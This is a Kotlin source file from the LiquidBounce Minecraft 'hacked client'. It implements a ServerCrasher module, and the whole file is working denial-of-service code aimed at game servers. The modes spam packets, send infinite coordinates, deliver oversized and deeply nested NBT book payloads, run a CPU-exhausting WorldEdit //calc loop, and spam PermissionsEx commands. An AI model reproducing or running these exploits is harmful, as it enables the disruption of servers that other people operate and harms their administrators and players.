/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.event.async.launchSequence
import net.ccbluex.liquidbounce.features.module.Category
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.utils.client.PacketUtils.sendPacket
import net.ccbluex.liquidbounce.utils.extensions.*
import net.ccbluex.liquidbounce.utils.kotlin.RandomUtils.randomNumber
import net.ccbluex.liquidbounce.utils.kotlin.RandomUtils.randomString
import net.ccbluex.liquidbounce.utils.timing.MSTimer
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement
import net.minecraft.network.play.client.C0APacketAnimation
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction
import net.minecraft.network.play.client.C17PacketCustomPayload
import net.minecraft.util.BlockPos
import kotlin.random.Random.Default.nextBoolean

object ServerCrasher : Module("ServerCrasher", Category.EXPLOIT) {

    private val mode by choices(
        "Mode", arrayOf(
            "Book",
            "Swing",
            "MassiveChunkLoading",
            "WorldEdit",
            "Pex",
            "CubeCraft",
            "AACNew", "AACOther", "AACOld",
            "BSign", "BEdit",
            "Netty", "Netty2"
        ), "Book"
    )

    private val pexTimer = MSTimer()

    private val bookForNetty: ItemStack by lazy {
        val string = ".".repeat(1953)

        val tag = NBTTagCompound {
            setString("author", "Netty$string")
            setString("title", string)
            this["pages"] = NBTTagList {
                repeat(340) {
                    appendTag(NBTTagString(string))
                }
            }
        }

        ItemStack(Items.writable_book).apply {
            tagCompound = tag
        }
    }

    private val packetBufferForNBT: PacketBuffer by lazy {
        val string = buildString(14458) {
            append('{')
            repeat(850) { append("extra:[{") }
            repeat(850) { append("text:a}],") }
            append("text:a}")
        }

        val tag = NBTTagCompound {
            this["author"] = randomString(20)
            this["title"] = randomString(20)
            this["resolved"] = 1
            this["pages"] = NBTTagList {
                repeat(2) {
                    appendTag(NBTTagString(string))
                }
            }
        }

        val book = ItemStack(Items.writable_book).apply {
            tagCompound = tag
        }

        PacketBuffer(Unpooled.buffer()).apply { writeItemStackToBuffer(book) }
    }

    override fun onEnable() {
        val thePlayer = mc.thePlayer ?: return

        when (mode.lowercase()) {
            "aacnew" -> {
                // Spam positions
                repeat(10000) {
                    sendPacket(
                        C04PacketPlayerPosition(
                            thePlayer.posX + 9412 * it,
                            thePlayer.entityBoundingBox.minY + 9412 * it,
                            thePlayer.posZ + 9412 * it,
                            true
                        )
                    )
                }
            }

            "aacother" -> {
                // Spam positions
                repeat(10000) {
                    sendPacket(
                        C04PacketPlayerPosition(
                            thePlayer.posX + 500000 * it,
                            thePlayer.entityBoundingBox.minY + 500000 * it,
                            thePlayer.posZ + 500000 * it,
                            true
                        )
                    )
                }
            }

            "aacold" -> {
                // Send negative infinity position
                sendPacket(
                    C04PacketPlayerPosition(
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY,
                        true
                    )
                )
            }

            "worldedit" -> {
                // Send crash command
                thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")
            }

            "cubecraft" -> {
                // Not really needed but doesn't matter
                thePlayer.setPosition(thePlayer.posX, thePlayer.posY + 0.3, thePlayer.posZ)
            }

            "massivechunkloading" -> {
                // Fly up into sky
                var yPos = thePlayer.posY
                while (yPos < 255) {
                    sendPacket(C04PacketPlayerPosition(thePlayer.posX, yPos, thePlayer.posZ, true))
                    yPos += 5.0
                }

                // Fly over world
                var i = 0
                while (i < 1337 * 5) {
                    sendPacket(C04PacketPlayerPosition(thePlayer.posX + i, 255.0, thePlayer.posZ + i, true))
                    i += 5
                }
            }

            "bsign" -> {
                sendPacket(C17PacketCustomPayload("MC|BSign", packetBufferForNBT))
            }

            "bedit" -> {
                sendPacket(C17PacketCustomPayload("MC|BEdit", packetBufferForNBT))
            }

            "netty" -> {
                sendPacket(C08PacketPlayerBlockPlacement(BlockPos(mc.thePlayer).down(2), 1, bookForNetty, 0f, 0f, 0f))
            }

            "netty2" -> {
                launchSequence(Dispatchers.IO) {
                    while (mc.netHandler.networkManager.isChannelOpen) {
                        sendPacket(C10PacketCreativeInventoryAction(100, bookForNetty))
                        delay(10L)
                    }
                }
            }
        }
    }

    val onMotion = handler<MotionEvent> { event ->
        val thePlayer = mc.thePlayer

        if (event.eventState == EventState.POST || thePlayer == null)
            return@handler

        when (mode.lowercase()) {
            "book" -> {
                val bookStack = ItemStack(Items.writable_book)
                val pageText = randomNumber(600)

                bookStack.tagCompound = NBTTagCompound {
                    this["author"] = randomNumber(20)
                    this["title"] = randomNumber(20)
                    this["pages"] = NBTTagList {
                        repeat(50) {
                            appendTag(NBTTagString(pageText))
                        }
                    }
                }

                repeat(100) {
                    val packetBuffer = PacketBuffer(Unpooled.buffer())
                    packetBuffer.writeItemStackToBuffer(bookStack)
                    sendPacket(C17PacketCustomPayload(if (nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                }
            }

            "cubecraft" -> {
                val (x, y, z) = thePlayer

                repeat(3000) {
                    sendPacket(C04PacketPlayerPosition(x, y + 0.09999999999999, z, false))
                    sendPacket(C04PacketPlayerPosition(x, y, z, true))
                }
                thePlayer.motionY = 0.0
            }

            "pex" -> if (pexTimer.hasTimePassed(2000)) {
                // Send crash command
                thePlayer.sendChatMessage(if (nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }

            "swing" -> {
                repeat(5000) {
                    sendPacket(C0APacketAnimation())
                }
            }

            else -> state = false // Disable module when mode is just a one run crasher
        }
    }

    val onWorld = handler<WorldEvent> { event ->
        if (event.worldClient == null)
            state = false // Disable module in case you left the server
    }

    val onTick = handler<GameTickEvent> {
        if (mc.thePlayer == null || mc.theWorld == null)
            state = false // Disable module in case you left the server
    }

    override val tag
        get() = mode
}
